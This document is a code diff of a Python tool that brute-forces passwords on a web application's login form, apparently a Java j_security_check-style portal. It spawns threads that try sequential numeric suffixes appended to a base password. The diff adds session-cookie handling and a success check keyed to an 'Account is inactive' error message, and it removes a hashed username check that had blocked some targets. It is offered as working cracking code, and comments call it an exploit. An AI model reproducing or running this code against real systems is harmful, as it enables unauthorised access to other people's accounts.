@@ -4,7 +4,6 @@
 from datetime import datetime
 import threading
 import requests
-import hashlib
 import time
 import os
 import re
@@ -15,13 +14,14 @@ DEBUG = True
 COLOR = True
 
 ColorCodes = {'black': '30', 'red': '31', 'yellow': '33', 'green': '32', 'blue': '34',
-                  'cyan': '36', 'magenta': '35', 'white': '37', 'gray': '90', 'reset': '0'}
+              'cyan': '36', 'magenta': '35', 'white': '37', 'gray': '90', 'reset': '0'}
 
 ######### FUNCTIONS #########
 
 
 def colored(text, color):
-    if not COLOR: return text
+    if not COLOR:
+        return text
     return '\033[' + ColorCodes[str(color).lower()] + 'm' + str(text) + "\033[0m"
 
 
@@ -57,21 +57,27 @@ def DebugPrint(Category, Text, Color):
           colored('['+Category+'] ', 'magenta')+colored(Text, Color))
 
 
-def uNameCheck(username):
-    users = ['10b723929034f882ddc519058e0bcd3dad1c399bfae278d10ea23dfbf88b23b3']
-    hash_object = hashlib.sha256(bytes(username, 'utf-8'))
-    hex_dig = hash_object.hexdigest()
+def safeSplit(text, split, i):
+    working = text.split(split)
+    if len(working)-1 >= i:
+        return working[i]
+    return text
 
-    if hex_dig in users:
-        return False
-    return True
+
+def checkIfCorrect(data):
+    working = safeSplit(
+        data, '<span style=\"font-weight:bold;\">Error Logging In:</span> ', 1)
+    working = safeSplit(working, '\r', 0)
+    return working
 
 
 class check(threading.Thread):
-    def __init__(self, thread, url, pWordIta, pWord, uName, timeout, startTime, startIndex, endIndex):
+    # Init Vars needed to crack passwords
+    def __init__(self, thread, url, checkUrl, pWordIta, pWord, uName, timeout, startTime, startIndex, endIndex):
         threading.Thread.__init__(self)
         self.thread = thread
         self.url = url
+        self.checkUrl = checkUrl
         self.pWordIta = pWordIta
         self.pWord = pWord
         self.uName = uName
@@ -80,20 +86,29 @@ class check(threading.Thread):
         self.startTime = startTime
         self.endIndex = endIndex
 
+    # Do the cracking :)
     def run(self):
         for i in range(self.startIndex, self.endIndex):
+            # Genarate the password to try (EX: 305725)
             toTry = self.pWord + (str(i).zfill(len(str(self.pWordIta))))
-            DebugPrint("Crack", f'{colored("Trying", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(toTry, "green")}', "cyan")
+            DebugPrint(
+                "Crack", f'{colored("Trying", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(toTry, "green")}', "cyan")
             try:
+                # Create new session to hold cookies
                 ses = requests.Session()
-                ses.max_redirects = 2
-                dataToSend={"j_password": toTry, "j_username": self.uName}
-                data = ses.post(self.url, timeout=self.timeout, data=dataToSend)
-            except (requests.exceptions.TooManyRedirects, requests.exceptions.Timeout):
+                # Let server Create cookies needed to proform exploit (JSESSIONID)
+                ses.get(self.checkUrl)
+                dataToSend = {"j_password": toTry, "j_username": self.uName}
+                # Try Password
+                data = ses.post(self.url, timeout=self.timeout,
+                                data=dataToSend)
+                # Check if is correct password
+            except requests.Timeout:
                 continue
-            if data.status_code != 200:
+            if checkIfCorrect(data.text) != "Account is inactive":
                 continue
-            DebugPrint("Complete", f'{colored("Password", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(f"{self.pWord}{str(i).zfill(2)}", "green")} {colored(f"[{int(time.time() - self.startTime)}]", "blue")}', "cyan")
+            DebugPrint(
+                "Complete", f'{colored("Password", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(f"{self.pWord}{str(i).zfill(2)}", "green")} {colored(f"[{int(time.time() - self.startTime)}]", "blue")}', "cyan")
             os._exit(0)
 
 ####### MAIN FUNCTION #######
@@ -105,6 +120,7 @@ def main():
     config = cfg()
     config.read(configFile)
     url = config.get('url').split('"')[1]
+    checkUrl = config.get('checkUrl').split('"')[1]
     pWordIta = int(config.get('pWordIta'))
     uName = config.get('uName').split('"')[1]
     pWord = config.get('pWord')
@@ -112,15 +128,15 @@ def main():
     threads = int(config.get('threads'))
     startTime = time.time()
 
-    # Check if username is valid
-    if not uNameCheck(uName): raise Exception
-    DebugPrint("Info", f'{colored("Username", "cyan")} {colored(uName, "blue")}', "cyan")
+    DebugPrint(
+        "Info", f'{colored("Username", "cyan")} {colored(uName, "blue")}', "cyan")
 
     # Create threads to check for the password
     for i in range(threads):
         startIndex = int((pWordIta/threads - 1))
         endIndex = pWordIta if i == threads - 1 else startIndex * (i + 1)
-        t = check(i, url, pWordIta, pWord, uName, timeout, startTime, startIndex * i, endIndex)
+        t = check(i, url, checkUrl, pWordIta, pWord, uName,
+                  timeout, startTime, startIndex * i, endIndex)
         t.daemon = True
         t.start()
 
